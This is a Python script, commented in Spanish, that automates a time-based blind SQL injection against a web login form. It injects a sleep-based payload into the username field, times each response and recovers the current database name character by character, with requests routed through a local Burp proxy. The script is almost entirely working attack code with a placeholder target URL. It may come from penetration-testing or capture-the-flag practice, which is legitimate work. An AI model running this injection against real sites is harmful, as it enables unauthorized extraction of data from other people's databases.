#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import * # pip3 install pwn

def def_handler(sig, frame):
	# Definimos que queremos que pase al pulsar Ctrl+C
	log.failure("Saliendo")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = 'url' #editable
# Utilizamos Burp Suite para tunelizar las peticiones web
burp = {'http': 'http://127.0.0.1:8080'}
# Definimos los caracteres que se van a probar
s = r'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ !"#$%&\'()*+,-./:;<=>?@[]^_'
resultado = ''

# Función para validar cuánto tarda el servidor web en responder
def check(payload):
	# Definir los datos que se tramitan vía POST
	data_post = {
		'username': '%s' % payload, # payload se va a pasar como argumento a esta función
		'password': 'test',
		'submit': '+Login+'
	}

	tiempo_inicio = time.time() # Obtener el tiempo actual
	content = requests.post(url, data=data_post, proxies=burp) # Tramitar la petición POST, con proxies=burp se tuneliza con Burp
	tiempo_fin = time.time()

	# Si el tiempo final menos el tiempo actual es mayor de 3 segundos
	# Esto quiere decir que la respuesta del lado del servidor ha tardado más de 3 segundos
	# Nunca tarda 3 segundos exactos, tarda más
	if tiempo_fin - tiempo_inicio > 3:
		return 1

p1 = log.progress("Base de datos")
p2 = log.progress("Payload")

# 10 define el número total de caracteres del nombre de la BBDD
for i in range(1, 10):
	# Recorrer cada carácter a probar de la variable c
	for c in s:
		payload = "' or if(substr(database(),%d,1)=binary(0x%s),sleep(3),1)-- -" % (i,c.encode('utf-8').hex())
		p2.status("%s" % payload) # Muestra todas las peticiones que se van tramitando a tiempo real
		if check(payload):
			# La variable resultado se va a ir ampliando con el nombre de la BBDD actual
			resultado += c
			p1.status("%s" % resultado)
			break

log.info("Base de datos: %s" % resultado) # Mostrar el nombre final de la BBDD actual
